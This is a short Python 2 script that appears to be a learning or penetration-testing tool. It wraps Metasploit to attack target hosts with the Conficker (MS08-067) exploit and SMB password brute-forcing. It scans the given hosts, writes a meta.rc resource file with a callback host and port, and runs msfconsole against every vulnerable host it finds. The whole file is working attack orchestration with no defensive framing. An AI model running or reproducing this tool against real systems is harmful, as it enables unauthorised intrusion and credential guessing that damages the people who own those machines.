import argparse
from Conficker import conficker
import os

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description=u'A Metasploit interface'
    )

    parser.add_argument(
        u'-H',
        dest='rhosts',
        required=True,
        help=u'The hosts that you wish to exploit'
    )

    parser.add_argument(
        u'-l',
        dest='lhost',
        required=True,
        help=u'The IP-address from which you wish to exploit (or you wish to map your IP to look like..'
    )

    parser.add_argument(
        u'-p',
        dest='lport',
        default=1337,
        help=u'The port that you wish to use for the exploit'
    )

    parser.add_argument(
        u'-F',
        dest='password_file',
        default='passwords.txt',
        help=u'The path to a file containing passwords'
    )
    arguments = parser.parse_args()

    if not os.path.isfile(arguments.password_file):
        print 'File not found.'
        parser.print_usage()
        raise SystemExit

    lhost = arguments.lhost
    lport = arguments.lport
    rhosts = arguments.rhosts
    pwds = arguments.password_file

    with open('meta.rc', 'wb') as cfg:
        operation = conficker(lhost, rhosts, lport, cfg , pwds)
        vulnerable_hosts = operation.find_vulnerable_hosts(rhosts)
        operation.setup_exploit_file()
        for vulnerable_host in vulnerable_hosts:
            operation.setup_conficker_exploit()
            operation.smb_brute()
    os.system('msfconsole -r meta.rc')
